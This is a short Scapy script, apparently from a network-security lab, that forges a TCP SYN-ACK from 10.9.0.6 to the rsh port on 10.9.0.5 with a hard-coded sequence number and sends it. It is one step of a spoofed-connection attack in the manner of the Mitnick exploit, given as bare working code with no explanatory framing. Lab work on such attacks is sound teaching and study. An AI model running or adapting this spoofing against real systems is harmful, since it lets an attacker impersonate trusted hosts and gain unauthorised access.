from scapy.all import *

ip = IP(src="10.9.0.6",dst="10.9.0.5")

tcp=TCP(sport=9090,dport = 514,flags="SA",seq=1915343163)

pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)